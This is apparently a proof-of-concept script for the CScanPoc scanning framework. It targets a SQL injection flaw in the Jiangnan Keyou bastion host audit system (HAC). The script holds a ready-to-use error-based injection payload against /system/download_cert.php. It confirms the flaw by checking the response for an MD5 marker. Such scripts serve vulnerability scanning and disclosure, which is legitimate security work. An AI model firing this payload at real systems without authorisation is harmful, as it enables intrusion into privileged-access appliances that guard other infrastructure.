# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time


class Vuln(ABVuln):
    vuln_id = 'Keyou_0003'  # 平台漏洞编号，留空
    name = '江南科友堡垒机 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''  
        江南科友运维安全审计系统（HAC）在 /system/download_cert.php?manager=1&user_id=2 处存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '江南科友堡垒机'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f7928615-9ddd-470f-8d61-1c1e4642c475'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/system/download_cert.php?manager=1&user_id=2%20and%20(select%202222%20from(select%20count(*),concat(md5(123),(select%20(case%20when%20(2222=2222)%20then%201%20else%200%20end)),0x7e7e7e,floor(Rand(0)*2))x%20from%20information_schema.character_sets%20group%20by%20x)a)&cert_psw=11'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and '202cb962ac59075b964b07152d234b701' in res:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
